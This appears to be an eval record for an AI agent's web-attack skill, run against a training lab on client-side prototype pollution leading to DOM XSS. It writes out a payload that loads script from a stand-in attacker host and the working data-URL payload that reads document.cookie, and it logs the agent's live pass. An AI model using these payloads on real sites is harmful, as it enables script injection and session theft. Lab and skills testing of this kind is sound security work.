# Eval: DOM XSS via client-side prototype pollution [PRACTITIONER]
- **Target:** /web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution
- **Sub-variant:** client-side prototype pollution source -> gadget -> script.src/innerHTML sink
- **Skill path:** advanced-techniques.md prototype pollution: find source `?__proto__[foo]=bar` (confirm Object.prototype.foo), find gadget (transport_url / script src), then `?__proto__[transport_url]=//attacker/evil` or the DOM-XSS gadget to reach the sink.
- **Pass:** [x] skill finds the source via __proto__; [x] identifies the gadget (transport_url -> script.src, per skill); [x] reaches an XSS sink
- **Mode:** live (agent-run, user-authorized)
- **Result:** PASS (agent-run live, 2026-11-16). Confirmed source: __proto__[foo]=bar pollutes Object.prototype.foo. Delivered /?__proto__[transport_url]=data:,alert(document.cookie)// (the script.src gadget from the skill); alert fired, lab solved (verified from second tab).
